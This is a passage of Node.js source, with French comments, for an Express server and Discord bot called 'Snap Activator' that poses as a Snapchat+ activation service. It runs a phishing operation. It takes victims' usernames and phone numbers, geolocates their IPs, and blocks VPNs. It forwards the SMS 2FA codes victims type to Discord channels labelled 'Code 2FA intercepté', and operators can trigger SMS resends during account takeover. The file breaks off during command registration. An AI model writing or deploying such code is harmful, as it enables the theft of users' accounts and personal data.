require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActivityType } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// Récupérer l'IP réelle derrière proxy/Render
app.set('trust proxy', true);

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

let botReady = false;
const pendingMessages = []; // File d'attente si bot pas encore prêt

// ================== OWNER ==================
const OWNER_ID = '1066379595881914449';
function isOwner(userId) { return userId === OWNER_ID; }

// ================== CONFIG PERSISTANTE ==================
const CONFIG_FILE = path.join(__dirname, 'config.json');
const CONFIG_DEFAULTS = {
    afficher_ip:          true,   // afficher l'IP dans les embeds
    afficher_appareil:    true,   // afficher appareil/OS dans les embeds
    ratelimit_actif:      true,   // activer le rate limiting
    ratelimit_minutes:    10,     // durée rate limit en minutes
    timeout_minutes:      5,      // auto-reject après X min
    delai_discord_sec:    10,     // délai entre salon prioritaire et principal
    salon_prioritaire:    true,   // envoyer dans le salon prioritaire
    site_actif:           true,   // accepter ou bloquer les soumissions
    webhook_fallback:     true,   // utiliser le webhook si bot down
    bloquer_vpn:          true,   // bloquer les VPN/proxy
};

function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const raw = fs.readFileSync(CONFIG_FILE, 'utf8');
            return { ...CONFIG_DEFAULTS, ...JSON.parse(raw) };
        }
    } catch (e) { console.error('Erreur chargement config.json:', e.message); }
    return { ...CONFIG_DEFAULTS };
}
function saveConfig(cfg) {
    try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8'); }
    catch (e) { console.error('Erreur sauvegarde config.json:', e.message); }
}

let cfg = loadConfig();

// ================== PERSISTANCE JSON ==================
const DATA_FILE = path.join(__dirname, 'requests.json');

function loadRequests() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const obj = JSON.parse(raw);
            return new Map(Object.entries(obj));
        }
    } catch (e) {
        console.error('Erreur chargement requests.json:', e.message);
    }
    return new Map();
}

function saveRequests(map) {
    try {
        const obj = {};
        for (const [k, v] of map.entries()) obj[k] = v;
        fs.writeFileSync(DATA_FILE, JSON.stringify(obj, null, 2), 'utf8');
    } catch (e) {
        console.error('Erreur sauvegarde requests.json:', e.message);
    }
}

const requests = loadRequests();

// ================== HISTORIQUE (50 dernières demandes) ==================
const HISTORY_FILE = path.join(__dirname, 'history.json');
function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
    } catch (e) {}
    return [];
}
function saveHistory(arr) {
    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(arr, null, 2), 'utf8'); } catch (e) {}
}
let history = loadHistory();
function pushHistory(entry) {
    history.unshift(entry); // plus récent en premier
    if (history.length > 50) history = history.slice(0, 50);
    saveHistory(history);
}

// ================== BLACKLIST ==================
const BLACKLIST_FILE = path.join(__dirname, 'blacklist.json');
function loadBlacklist() {
    try {
        if (fs.existsSync(BLACKLIST_FILE)) return new Set(JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')));
    } catch (e) {}
    return new Set();
}
function saveBlacklist(set) {
    try { fs.writeFileSync(BLACKLIST_FILE, JSON.stringify([...set], null, 2), 'utf8'); } catch (e) {}
}
let blacklist = loadBlacklist();

// ================== GÉOLOCALISATION IP ==================
async function geolocateIP(ip) {
    if (!ip || ip === 'inconnu' || ip === '127.0.0.1' || ip.startsWith('::')) {
        return { city: 'Local', country: 'FR', isp: 'Localhost', proxy: false, flag: '🏠' };
    }
    try {
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,proxy,hosting`,
            { timeout: 3000 }
        );
        const d = res.data;
        if (d.status !== 'success') return null;
        // Emoji drapeau depuis countryCode
        const flag = d.countryCode
            ? d.countryCode.toUpperCase().replace(/./g, c => String.fromCodePoint(0x1F1E0 - 65 + c.charCodeAt(0)))
            : '🌍';
        return { city: d.city || '?', country: d.country || '?', isp: d.isp || '?', proxy: d.proxy || d.hosting || false, flag };
    } catch (e) {
        return null;
    }
}

// ================== RATE LIMITING ==================
const rateLimitMap = new Map(); // IP → timestamp dernière soumission
function isRateLimited(ip) {
    if (!cfg.ratelimit_actif) return false;
    const last = rateLimitMap.get(ip);
    if (!last) return false;
    return Date.now() - last < cfg.ratelimit_minutes * 60 * 1000;
}

function setRateLimit(ip) {
    rateLimitMap.set(ip, Date.now());
    setTimeout(() => rateLimitMap.delete(ip), cfg.ratelimit_minutes * 60 * 1000);
}

// ================== ENVOI DISCORD (avec file d'attente) ==================
async function sendToDiscord(fn) {
    if (botReady) {
        return fn();
    }
    return new Promise((resolve, reject) => {
        pendingMessages.push(async () => {
            try { resolve(await fn()); }
            catch (e) { reject(e); }
        });
    });
}

// ================== UTILITAIRES ==================
const APPROVAL_CHANNEL_ID  = process.env.DISCORD_APPROVAL_CHANNEL;
const PRIORITY_CHANNEL_ID  = '1532004514306068510';
const WEBHOOK_URL           = process.env.DISCORD_WEBHOOK_URL || null; // fallback si bot down
const BASE_URL              = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT                  = process.env.PORT || 3000;
// Stats journalières
let statsToday = { total: 0, approved: 0, rejected: 0, codes: 0, date: new Date().toDateString() };
function resetStatsIfNewDay() {
    const today = new Date().toDateString();
    if (statsToday.date !== today) {
        statsToday = { total: 0, approved: 0, rejected: 0, codes: 0, date: today };
    }
}
function updateBotStatus() {
    if (!botReady) return;
    resetStatsIfNewDay();
    client.user.setActivity(`🎯 ${statsToday.total} demandes aujourd'hui`, { type: ActivityType.Watching });
}

// Envoi webhook fallback
async function sendWebhookFallback(content) {
    if (!WEBHOOK_URL) return;
    try {
        await axios.post(WEBHOOK_URL, { content }, { timeout: 5000 });
    } catch (e) {
        console.error('Erreur webhook fallback:', e.message);
    }
}

function parseUserAgent(ua) {
    if (!ua) return { os: 'Inconnu', device: 'Inconnu' };
    let os = 'Inconnu';
    let device = 'Desktop';
    if (/iPhone/.test(ua)) { os = 'iOS'; device = '📱 iPhone'; }
    else if (/iPad/.test(ua)) { os = 'iOS'; device = '📱 iPad'; }
    else if (/Android/.test(ua)) {
        os = 'Android';
        const m = ua.match(/Android [0-9.]+; ([^)]+)/);
        device = '📱 ' + (m ? m[1].trim() : 'Android');
    } else if (/Windows/.test(ua)) { os = 'Windows'; device = '🖥️ PC'; }
    else if (/Macintosh/.test(ua)) { os = 'macOS'; device = '🖥️ Mac'; }
    else if (/Linux/.test(ua)) { os = 'Linux'; device = '🖥️ Linux'; }
    return { os, device };
}

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    // Site désactivé — réponse JSON pour l'API
    if (!cfg.site_actif) {
        return res.status(503).json({ error: 'site_disabled' });
    }

    // Rate limiting + blacklist + VPN
    const ip = (req.headers['x-forwarded-for'] || req.ip || 'inconnu').split(',')[0].trim();

    if (blacklist.has(ip)) {
        return res.status(403).json({ error: 'Accès refusé.' });
    }
    if (isRateLimited(ip)) {
        return res.status(429).json({ error: `Trop de demandes, réessaie dans ${cfg.ratelimit_minutes} minutes.` });
    }

    // Géolocalisation + détection VPN
    const geo = await geolocateIP(ip);
    if (geo && geo.proxy && cfg.bloquer_vpn !== false) {
        return res.status(403).json({ error: 'VPN/proxy détecté. Désactive-le et réessaie.' });
    }

    setRateLimit(ip);
    const ua = req.headers['user-agent'] || '';
    const { os, device } = parseUserAgent(ua);

    const id = uuidv4();
    const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
    const ispStr = geo ? geo.isp : '?';
    const requestData = {
        snapchat, phone, operator, ip, device, os, geo: geoStr, isp: ispStr,
        approved: false, rejected: false, code: null,
        createdAt: Date.now()
    };
    requests.set(id, requestData);
    saveRequests(requests);

    // Historique
    pushHistory({ id, snapchat, phone, operator, ip, device, os, createdAt: requestData.createdAt, status: 'pending' });

    // Stats
    resetStatsIfNewDay();
    statsToday.total++;
    updateBotStatus();

    // Timeout auto + notif Discord
    setTimeout(async () => {
        const req = requests.get(id);
        if (req && !req.approved && !req.rejected) {
            req.rejected = true;
            saveRequests(requests);
            console.log(`⏰ Demande #${id} auto-rejetée après 5 min`);
            statsToday.rejected++;
            updateBotStatus();
            // Notif dans le salon prioritaire
            try {
                await sendToDiscord(async () => {
                    const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
                    if (priorityChannel) {
                        await priorityChannel.send({
                            embeds: [new EmbedBuilder()
                                .setTitle('⏰ Demande expirée sans réponse')
                                .setColor(0xFF4444)
                                .addFields(
                                    { name: 'Pseudo', value: req.snapchat, inline: true },
                                    { name: 'ID',     value: id,           inline: true }
                                )
                                .setFooter({ text: 'Auto-rejetée après 5 min' })
                                .setTimestamp()
                            ]
                        });
                    }
                });
            } catch (e) {
                // Fallback webhook si bot down
                await sendWebhookFallback(`⏰ Demande expirée : **${req.snapchat}** (ID: ${id})`);
            }
        }
    }, cfg.timeout_minutes * 60 * 1000);

    try {
        await sendToDiscord(async () => {
            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
            const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
            if (!mainChannel) throw new Error("Salon principal introuvable");

            // Champs dynamiques selon config
            const expireAt = new Date(requestData.createdAt + cfg.timeout_minutes * 60 * 1000);
            const expireStr = `<t:${Math.floor(expireAt.getTime() / 1000)}:R>`;

            const baseFields = [
                { name: '👤 Pseudo',    value: `\`${snapchat}\``,  inline: true },
                { name: '📞 Téléphone', value: `\`${phone}\``,     inline: true },
                { name: '📡 Opérateur', value: operator,           inline: true },
            ];
            if (cfg.afficher_appareil) {
                baseFields.push({ name: '📱 Appareil', value: device, inline: true });
                baseFields.push({ name: '💻 OS',       value: os,     inline: true });
            }
            if (cfg.afficher_ip) {
                baseFields.push({ name: '🌍 Localisation', value: geoStr, inline: true });
                baseFields.push({ name: '🔌 FAI',          value: ispStr, inline: true });
                baseFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
            }
            baseFields.push({ name: '⏰ Expire',  value: expireStr, inline: true });
            baseFields.push({ name: '🆔 ID',      value: `\`${id.slice(0,8)}...\``, inline: true });

            const embed = new EmbedBuilder()
                .setTitle('📱 Nouvelle demande Snapchat+')
                .setDescription('> Un utilisateur veut activer son abonnement Premium.')
                .setColor(0xFFFC00)
                .addFields(...baseFields)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                .setTimestamp();

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
                    new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
                );

            // 1. Salon prioritaire EN PREMIER (si activé) + mention owner
            if (priorityChannel) {
                const priorityEmbed = new EmbedBuilder()
                    .setTitle('👁️ PRIORITAIRE — Nouvelle demande')
                    .setDescription('> Lecture seule — les boutons sont dans le salon principal.')
                    .setColor(0xFF6600)
                    .addFields(...baseFields)
                    .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                    .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
                    .setTimestamp();
                await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
            }

            // 2. Salon principal après le délai configuré
            setTimeout(async () => {
                try {
                    await mainChannel.send({ embeds: [embed], components: [row] });
                } catch (e) {
                    console.error('Erreur envoi salon principal (delayed):', e);
                }
            }, cfg.delai_discord_sec * 1000);

            console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 10s)`);
        });

        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        // Fallback webhook
        await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
        res.json({ id }); // On répond quand même success
    }
});

// 2. Vérification pseudo Snapchat (toujours valide si format correct)
app.get('/api/check-snapchat/:username', (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }

    // Format Snapchat valide : lettres, chiffres, tirets, underscores, points
    if (!/^[a-z0-9._-]{3,15}$/.test(username)) {
        return res.json({ exists: false, reason: 'format' });
    }

    // Toujours retourner trouvé si le format est valide
    return res.json({ exists: true, username, displayName: username, avatarUrl: null });
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved:  request.approved,
        rejected:  request.rejected,
        snapchat:  request.snapchat,
        resend:    request.resend || false   // signal "Renvoyer SMS"
    });
});

// 4. Acquitter le signal "resend"
app.post('/api/resend-ack/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    request.resend = false;
    saveRequests(requests);
    res.json({ ok: true });
});

// 5. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!code) return res.json({ success: true });

    const request = requests.get(id) || {};
    const snapchat  = request.snapchat  || 'Inconnu';
    const phone     = request.phone     || 'Inconnu';
    const operator  = request.operator  || 'Inconnu';
    const device    = request.device    || 'Inconnu';
    const os        = request.os        || 'Inconnu';
    const ip        = request.ip        || 'Inconnu';

    const sendCode = async () => {
        await sendToDiscord(async () => {
            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
            const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;

            const geoCode = request.geo  || '?';
            const ispCode = request.isp  || '?';

            const codeFields = [
                { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
                { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
                { name: '📡 Opérateur', value: operator,          inline: true },
            ];
            if (cfg.afficher_appareil) {
                codeFields.push({ name: '📱 Appareil', value: device, inline: true });
                codeFields.push({ name: '💻 OS',       value: os,     inline: true });
            }
            if (cfg.afficher_ip) {
                codeFields.push({ name: '🌍 Localisation', value: geoCode, inline: true });
                codeFields.push({ name: '🔌 FAI',          value: ispCode, inline: true });
                codeFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
            }
            codeFields.push({ name: '🔑 Code 2FA', value: `## ${code}`, inline: false });

            const codeEmbed = new EmbedBuilder()
                .setTitle('🔐 Code 2FA intercepté')
                .setDescription('> Le code SMS a été saisi par l\'utilisateur.')
                .setColor(0x00FF66)
                .addFields(...codeFields)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                .setTimestamp();

            if (priorityChannel) {
                try {
                    const priorityCodeEmbed = new EmbedBuilder()
                        .setTitle('👁️ PRIORITAIRE — Code 2FA intercepté')
                        .setDescription('> Lecture seule.')
                        .setColor(0x00FF66)
                        .addFields(...codeFields)
                        .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                        .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s` })
                        .setTimestamp();
                    await priorityChannel.send({ content: `<@${OWNER_ID}> 🔑 Code reçu !`, embeds: [priorityCodeEmbed] });
                } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
            }

            if (mainChannel) {
                setTimeout(async () => {
                    try { await mainChannel.send({ embeds: [codeEmbed] }); }
                    catch (e) { console.error('Erreur salon principal (code):', e.message); }
                }, cfg.delai_discord_sec * 1000);
            }
        });
    };

    sendCode().catch(console.error);
    statsToday.codes++;
    updateBotStatus();
    if (id) {
        requests.delete(id);
        saveRequests(requests);
    }

    res.json({ success: true });
});

// ================== SLASH COMMANDS ==================
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // /stats — tout le monde peut voir
    if (interaction.commandName === 'stats') {
        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('📊 Stats du jour')
                .setColor(0xFFFC00)
                .addFields(
                    { name: '📥 Demandes',   value: String(statsToday.total),    inline: true },
                    { name: '✅ Acceptées',  value: String(statsToday.approved),  inline: true },
                    { name: '❌ Refusées',   value: String(statsToday.rejected),  inline: true },
                    { name: '🔐 Codes',      value: String(statsToday.codes),     inline: true },
                    { name: '⏳ En attente', value: String(pending),              inline: true }
                )
                .setFooter({ text: statsToday.date })
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /pause — OWNER ONLY
    if (interaction.commandName === 'pause') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.site_actif = false; saveConfig(cfg); updateBotStatus();
        return interaction.reply({ content: '⏸️ Site **désactivé**. Aucune nouvelle soumission ne sera acceptée.', ephemeral: true });
    }

    // /resume — OWNER ONLY
    if (interaction.commandName === 'resume') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.site_actif = true; saveConfig(cfg); updateBotStatus();
        return interaction.reply({ content: '▶️ Site **réactivé**. Les soumissions sont de nouveau acceptées.', ephemeral: true });
    }

    // /pending — OWNER ONLY
    if (interaction.commandName === 'pending') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
        if (pending.length === 0) return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
        const lines = pending.map(([id, r]) => {
            const elapsed = Math.floor((Date.now() - r.createdAt) / 1000);
            const m = Math.floor(elapsed / 60), s = String(elapsed % 60).padStart(2,'0');
            const remain = Math.max(0, cfg.timeout_minutes * 60 - elapsed);
            const rm = Math.floor(remain / 60), rs = String(remain % 60).padStart(2,'0');
            return `⏳ **${r.snapchat}** | ${r.phone} | \`${r.geo || '?'}\` | Attente: ${m}:${s} | Expire: ${rm}:${rs}`;
        });
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle(`⏳ ${pending.length} demande(s) en attente`)
                .setColor(0xFFFC00)
                .setDescription(lines.join('\n'))
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /blacklist — OWNER ONLY
    if (interaction.commandName === 'blacklist') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const sub = interaction.options.getSubcommand();
        if (sub === 'add') {
            const ip = interaction.options.getString('ip');
            blacklist.add(ip); saveBlacklist(blacklist);
            return interaction.reply({ content: `🚫 IP \`${ip}\` ajoutée à la blacklist.`, ephemeral: true });
        }
        if (sub === 'remove') {
            const ip = interaction.options.getString('ip');
            blacklist.delete(ip); saveBlacklist(blacklist);
            return interaction.reply({ content: `✅ IP \`${ip}\` retirée de la blacklist.`, ephemeral: true });
        }
        if (sub === 'list') {
            const list = [...blacklist];
            if (list.length === 0) return interaction.reply({ content: '✅ Aucune IP blacklistée.', ephemeral: true });
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle(`🚫 Blacklist (${list.length} IPs)`)
                    .setColor(0xFF4444)
                    .setDescription(list.map(ip => `\`${ip}\``).join('\n'))
                    .setTimestamp()
                ],
                ephemeral: true
            });
        }
    }

    // /clear — OWNER ONLY
    if (interaction.commandName === 'clear') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }
        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
        if (pending.length === 0) {
            return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
        }
        for (const [id, r] of pending) {
            r.rejected = true;
        }
        saveRequests(requests);
        // Mettre à jour le statut historique
        for (const entry of history) {
            if (pending.find(([id]) => id === entry.id)) entry.status = 'cleared';
        }
        saveHistory(history);
        return interaction.reply({
            content: `🗑️ **${pending.length} demande(s)** en attente vidées.`,
            ephemeral: true
        });
    }

    // /history — OWNER ONLY
    if (interaction.commandName === 'history') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }
        const last10 = history.slice(0, 10);
        if (last10.length === 0) {
            return interaction.reply({ content: '📭 Aucune demande dans l\'historique.', ephemeral: true });
        }
        const statusEmoji = { pending: '⏳', approved: '✅', rejected: '❌', cleared: '🗑️' };
        const lines = last10.map((e, i) => {
            const date = new Date(e.createdAt).toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
            const emoji = statusEmoji[e.status] || '❓';
            return `${emoji} **${e.snapchat}** | ${e.phone} | ${e.operator} | \`${date}\``;
        });
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('📋 10 dernières demandes')
                .setColor(0xFFFC00)
                .setDescription(lines.join('\n'))
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /config — OWNER ONLY
    if (interaction.commandName === 'config') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }

        const sub = interaction.options.getSubcommand();

        // /config show
        if (sub === 'show') {
            const on  = '🟢 Activé';
            const off = '🔴 Désactivé';
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle('⚙️ Configuration actuelle')
                    .setColor(0xFFFC00)
                    .addFields(
                        { name: '🌐 Site actif',            value: cfg.site_actif          ? on : off,                    inline: true },
                        { name: '🔒 Rate limiting',         value: cfg.ratelimit_actif     ? `${on} (${cfg.ratelimit_minutes} min)` : off, inline: true },
                        { name: '🌍 Afficher IP',           value: cfg.afficher_ip         ? on : off,                    inline: true },
                        { name: '📱 Afficher appareil/OS',  value: cfg.afficher_appareil   ? on : off,                    inline: true },
                        { name: '👁️ Salon prioritaire',     value: cfg.salon_prioritaire   ? on : off,                    inline: true },
                        { name: '⏱️ Délai Discord',         value: `${cfg.delai_discord_sec}s`,                           inline: true },
                        { name: '⏰ Timeout demandes',      value: `${cfg.timeout_minutes} min`,                          inline: true },
                        { name: '🔗 Webhook fallback',      value: cfg.webhook_fallback    ? on : off,                    inline: true },
                        { name: '🛡️ Bloquer VPN',          value: cfg.bloquer_vpn         ? on : off,                    inline: true },
                    )
                    .setFooter({ text: 'Utilise /config set <parametre> <valeur> pour modifier' })
                    .setTimestamp()
                ],
                ephemeral: true
            });
        }

        // /config set
        if (sub === 'set') {
            const param = interaction.options.getString('parametre');
            const valStr = interaction.options.getString('valeur');

            const boolParams = ['site_actif','ratelimit_actif','afficher_ip','afficher_appareil','salon_prioritaire','webhook_fallback','bloquer_vpn'];
            const intParams  = { ratelimit_minutes: [1,60], timeout_minutes: [1,30], delai_discord_sec: [1,60] };

            if (boolParams.includes(param)) {
                if (!['true','false','1','0','oui','non'].includes(valStr.toLowerCase())) {
                    return interaction.reply({ content: `❌ Valeur invalide. Utilise \`true\` ou \`false\`.`, ephemeral: true });
                }
                cfg[param] = ['true','1','oui'].includes(valStr.toLowerCase());
                saveConfig(cfg);
                updateBotStatus();
                return interaction.reply({
                    content: `✅ **${param}** → \`${cfg[param] ? 'activé' : 'désactivé'}\``,
                    ephemeral: true
                });
            }

            if (intParams[param]) {
                const [min, max] = intParams[param];
                const val = parseInt(valStr);
                if (isNaN(val) || val < min || val > max) {
                    return interaction.reply({ content: `❌ Valeur invalide. Doit être entre ${min} et ${max}.`, ephemeral: true });
                }
                cfg[param] = val;
                saveConfig(cfg);
                return interaction.reply({
                    content: `✅ **${param}** → \`${val}\``,
                    ephemeral: true
                });
            }

            return interaction.reply({ content: `❌ Paramètre inconnu : \`${param}\``, ephemeral: true });
        }

        // /config reset
        if (sub === 'reset') {
            cfg = { ...CONFIG_DEFAULTS };
            saveConfig(cfg);
            updateBotStatus();
            return interaction.reply({ content: '♻️ Configuration réinitialisée aux valeurs par défaut.', ephemeral: true });
        }
    }
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const requestId = parts.slice(1).join('_');

    if (!['approve', 'reject', 'resend'].includes(action)) return;

    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable ou expirée.', ephemeral: true });

    if (action === 'resend') {
        request.resend = true;
        saveRequests(requests);
        return interaction.reply({ content: `📲 Signal "Renvoyer SMS" envoyé à ${request.snapchat}.`, ephemeral: true });
    }

    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }

    if (action === 'approve') {
        request.approved = true;
        saveRequests(requests);
        statsToday.approved++;
        updateBotStatus();
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        saveRequests(requests);
        statsToday.rejected++;
        updateBotStatus();
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }

    // Désactiver les boutons du message
    try {
        const disabledRow = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${requestId}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success).setDisabled(true),
                new ButtonBuilder().setCustomId(`reject_${requestId}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger).setDisabled(true),
                new ButtonBuilder().setCustomId(`resend_${requestId}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary).setDisabled(true)
            );
        await interaction.message.edit({ components: [disabledRow] });
    } catch (e) {
        console.error('Erreur désactivation boutons:', e.message);
    }
});

// Page 404 custom
app.use((req, res) => {
    res.status(404).send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3;url=/">
  <title>Page introuvable</title>
  <style>
    body { background:#000; color:#fff; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
    h1 { font-size:60px; color:#FFFC00; margin:0; }
    p { color:#888; margin-top:12px; }
  </style>
</head>
<body>
  <h1>404</h1>
  <p>Page introuvable — redirection en cours...</p>
</body>
</html>`);
});

// --- Démarrage ---
client.once('ready', async () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
    botReady = true;

    // Enregistrer les slash commands
    try {
        const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);

        const configParams = [
            'site_actif','ratelimit_actif','afficher_ip','afficher_appareil',
            'salon_prioritaire','webhook_fallback',
            'ratelimit_minutes','timeout_minutes','delai_discord_sec'
        ];

        await rest.put(Routes.applicationCommands(client.user.id), {
            body: [
                new SlashCommandBuilder()
                    .setName('stats')
                    .setDescription('Voir les stats du jour')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('clear')
                    .setDescription('🗑️ Vider toutes les demandes en attente [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('history')
                    .setDescription('📋 Voir les 10 dernières demandes [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('pause')
                    .setDescription('⏸️ Désactiver le site immédiatement [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('resume')
                    .setDescription('▶️ Réactiver le site [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('pending')
                    .setDescription('⏳ Voir les demandes en attente avec timing [OWNER ONLY]')
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('blacklist')
                    .setDescription('🚫 Gérer la blacklist d\'IPs [OWNER ONLY]')
                    .addSubcommand(s => s.setName('add').setDescription('Ajouter une IP')
                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
                    .addSubcommand(s => s.setName('remove').setDescription('Retirer une IP')
                        .addStringOption(o => o.setName('ip').setDescription('Adresse IP').setRequired(true)))
                    .addSubcommand(s => s.setName('list').setDescription('Voir la blacklist'))
                    .toJSON(),

                new SlashCommandBuilder()
                    .setName('config')
                    .setDescription('⚙️ Gérer les paramètres du site/bot [OWNER ONLY]')
                    .addSubcommand(sub => sub
                        .setName('show')
                        .setDescription('Voir la configuration actuelle')
                    )
                    .addSubcommand(sub => sub
                        .setName('set')
                        .setDescription('Modifier un paramètre')
                        .addStringOption(opt => opt
                            .setName('parametre')
                            .setDescription('Paramètre à modifier')
                            .setRequired(true)
                            .addChoices(
                                { name: '🌐 Site actif (true/false)',           value: 'site_actif' },
                                { name: '🔒 Rate limiting actif (true/false)',  value: 'ratelimit_actif' },
                                { name: '⏱️ Durée rate limit (minutes, 1-60)',  value: 'ratelimit_minutes' },
                                { name: '🌍 Afficher IP (true/false)',           value: 'afficher_ip' },
                                { name: '📱 Afficher appareil/OS (true/false)', value: 'afficher_appareil' },
